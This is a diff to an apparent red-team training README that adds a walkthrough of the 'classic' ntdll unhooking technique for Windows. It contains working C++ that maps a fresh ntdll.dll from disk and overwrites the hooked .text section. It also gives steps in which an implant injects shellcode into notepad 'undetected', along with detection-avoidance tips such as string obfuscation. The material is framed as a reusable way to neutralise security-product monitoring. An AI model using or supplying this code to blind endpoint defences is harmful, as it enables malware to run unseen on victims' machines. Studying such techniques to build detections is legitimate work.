@@ -32,7 +32,7 @@ When security products inject their monitoring DLLs, they modify these functions
 
 ```assembly
 ; Hooked function example (NtAdjustPrivilegesToken)
-jmp 00007FFC20A72B33        ; Jump to injected code
+jmp  7FFCABAF0080        ; Jump to injected code
 ```
 
 The jump redirects execution to security product code that:
@@ -466,6 +466,238 @@ jmp back_to_original_code
 
 
 <details>
-<summary>03 - Process Unhooking Classic</summary>
+<summary>03 - Process Unhooking Classic Method</summary>
+
+## Overview
+
+The classic unhooking method involves loading a fresh, clean copy of ntdll.dll from disk and using it to overwrite the hooked version in memory. This technique removes security product hooks and restores original system call functionality, allowing successful code injection without detection.
+
+<img width="420" height="210" alt="Project Overview" src="https://github.com/user-attachments/assets/327be859-1517-4667-9f4c-abfbf6cc4855" />
+
+## Implementation
+
+### Core Concept
+
+The technique works by:
+1. Loading a fresh, unhooked copy of ntdll.dll from disk
+2. Parsing PE headers to locate the .text section containing code
+3. Overwriting the hooked ntdll in memory with clean code
+4. Performing injection using now-unhooked system calls
+
+### Code Implementation
+
+[02.FreshCopy](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/02.FreshCopy)
+
+#### Main Unhooking Flow
+
+```cpp
+// 1. Decrypt ntdll.dll path (obfuscated to avoid detection)
+XORcrypt((char *) sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
+
+// 2. Open fresh ntdll.dll from disk
+hFile = CreateFile((LPCSTR) sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+
+// 3. Map file into memory
+hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+
+// 4. Remove hooks using fresh copy
+ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pMapping);
+
+// 5. Perform injection with clean syscalls
+// ... injection code ...
+```
+
+<img width="1614" height="720" alt="Main unhooking flow code" src="https://github.com/user-attachments/assets/23b20f5a-b07b-4e66-8163-254ef8acc3a8" />
+
+#### Unhooking Function
+
+```cpp
+/*
+    UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll 
+    and copies over the hooked one
+*/
+DWORD UnhookNtdll(HMODULE hNtdll, LPVOID pMapping) {
+    DWORD oldprotect = 0;
+    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
+    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);
+    
+    // Find .text section
+    for (int i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
+        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
+                                            ((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));
+
+        if (!strcmp((char *) pImgSectionHead->Name, ".text")) {
+            // Change memory protection to writable
+            VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
+                            pImgSectionHead->Misc.VirtualSize,
+                            PAGE_EXECUTE_READWRITE,
+                            &oldprotect);
+            
+            // Copy fresh .text section over hooked version
+            memcpy((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
+                   (LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
+                   pImgSectionHead->Misc.VirtualSize);
+
+            // Restore original memory protection
+            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
+                            pImgSectionHead->Misc.VirtualSize,
+                            oldprotect,
+                            &oldprotect);
+            return 0;
+        }
+    }
+    return -1;
+}
+```
+
+## Step-by-Step Execution
+
+### Step 1: Environment Setup
+
+```batch
+# Create test directory
+mkdir C:\tests
+
+# Copy and prepare executable
+copy implant.exe C:\tests\implant-fc.exe
+```
+
+### Step 2: Compile the Code
+
+```batch
+# Run compilation script
+compile.bat
+```
+
+<img width="908" height="272" alt="Compilation output" src="https://github.com/user-attachments/assets/6874a95e-a19e-4b14-a438-b801a1f61df3" />
+
+### Step 3: Initial Execution
+
+```batch
+# Start target process
+notepad.exe
+
+# Execute unhooking implant
+implant-fc.exe
+```
+
+**Output**: `Check 1!` - This indicates the fresh ntdll has been mapped but hooks are still present.
+
+<img width="1437" height="373" alt="Initial execution checkpoint" src="https://github.com/user-attachments/assets/068683e4-98d8-47fd-8542-6a632b7bd232" />
+
+### Step 4: Memory Analysis Before Unhooking
+
+At `Check 1`, we can observe two ntdll instances in memory:
+
+- **Original ntdll**: Loaded by OS with security product hooks
+- **Fresh ntdll**: Mapped from disk, clean and unhooked
+
+<img width="1607" height="802" alt="Dual ntdll instances in memory" src="https://github.com/user-attachments/assets/dadd5173-6499-4949-b94b-26f78070ec0e" />
+
+<img width="1615" height="804" alt="Fresh ntdll copy details" src="https://github.com/user-attachments/assets/68a828aa-7e86-49fe-b111-ba5901c6bab5" />
+
+### Step 5: Debugger Analysis - Hooks Present
+
+Attaching a debugger before unhooking reveals hooked functions:
+
+<img width="1611" height="799" alt="Debugger attached to process" src="https://github.com/user-attachments/assets/ecf7d6c8-e878-4357-9ce0-297de7a2504d" />
+
+<img width="1610" height="796" alt="Token privileges examination" src="https://github.com/user-attachments/assets/a809126e-1550-4056-98db-d30bffb2b66b" />
+
+```assembly
+; Hooked function example
+ntdll!NtAdjustPrivilegesToken:
+jmp  7FFCABAF0080      ; Jump to AV monitoring code
+```
+
+<img width="1609" height="798" alt="Hooked function visible in debugger" src="https://github.com/user-attachments/assets/bd295c02-4295-4169-8101-26c8f572bd9d" />
+
+### Step 6: Execute Unhooking
+
+Press Enter to continue execution. The program reaches `Check 2!` after the unhooking function completes.
+
+<img width="1607" height="790" alt="Post-unhook checkpoint reached" src="https://github.com/user-attachments/assets/25077889-0c45-44a9-8e76-2158b9deed82" />
+
+### Step 7: Verify Hooks Removed
+
+Re-analyze the ntdll module in debugger:
+
+```assembly
+; After unhooking - clean syscall structure
+ntdll!NtMapViewOfSection:
+mov r10, rcx
+mov eax, 28h
+syscall
+ret
+```
+
+<img width="1609" height="793" alt="Clean syscall after unhooking" src="https://github.com/user-attachments/assets/e41920e4-d0aa-4f63-b836-528bf43ad7da" />
+
+Search for other system calls to verify all hooks are removed:
+
+<img width="1611" height="796" alt="Searching for system calls" src="https://github.com/user-attachments/assets/8767c049-2c69-47de-930a-8f8837f5de32" />
+
+All system calls in the .text section are now clean and free from hooks:
+
+<img width="1606" height="798" alt="All syscalls clean after unhooking" src="https://github.com/user-attachments/assets/a4f3f140-f427-448d-9a21-d9c4efb73955" />
+
+### Step 8: Successful Injection
+
+With hooks removed, the injection proceeds undetected:
+
+- Shellcode executes successfully in notepad
+- No security product intervention
+- MessageBox appears confirming successful execution
+
+<img width="677" height="269" alt="Successful shellcode execution" src="https://github.com/user-attachments/assets/de98d663-9453-4c94-8271-08919237511b" />
+
+<img width="1274" height="391" alt="No detection by security products" src="https://github.com/user-attachments/assets/69c9abb2-bd99-4e9e-9f1e-8bd368c65df0" />
+
+<img width="1283" height="722" alt="Final successful execution result" src="https://github.com/user-attachments/assets/729f264a-12ab-4e39-b2a3-930c7e67bacc" />
+
+## Technical Details
+
+### How the Unhooking Works
+
+1. **PE Header Parsing**: Locates the .text section containing executable code
+2. **Memory Protection Modification**: Temporarily makes the .text section writable
+3. **Code Overwrite**: Replaces hooked code with clean version from disk
+4. **Protection Restoration**: Returns memory to original read/execute permissions
+
+### Critical Components
+
+- **String Obfuscation**: ntdll path is XOR encrypted to avoid static detection
+- **Dynamic API Resolution**: VirtualProtect address retrieved at runtime
+- **PE Structure Navigation**: Manual parsing of DOS and NT headers
+- **Memory Management**: Proper protection flag handling
+
+## Advantages
+
+- **Comprehensive**: Removes all hooks from ntdll in one operation
+- **Effective**: Completely bypasses user-mode API monitoring
+- **Reliable**: Works across different security products using similar hooking methods
+- **Reusable**: Can be integrated into various injection techniques
+
+## Limitations
+
+- **Detection Risk**: Memory protection changes may be monitored
+- **Process-Specific**: Only affects current process instance
+- **OS Version Dependency**: Fresh ntdll must match running OS version
+- **File Access**: Requires read access to system32\ntdll.dll
+
+## Detection Avoidance
+
+- Use obfuscated strings for critical function names
+- Implement the unhooking early in execution before monitoring is active
+- Consider combining with other evasion techniques for layered protection
+- Test against multiple security products for compatibility
+
+## Conclusion
+
+The classic unhooking method provides a robust foundation for bypassing user-mode API hooks. By understanding and implementing this technique, you can effectively neutralize security product monitoring and execute code undetected.
+
+This approach demonstrates the fundamental principle that security products rely on hooking critical system functions, and by restoring these functions to their original state, we can operate without interference.
+
+The step-by-step execution with debugger verification ensures that the unhooking process is complete and effective before proceeding with injection operations.
 
 </details>
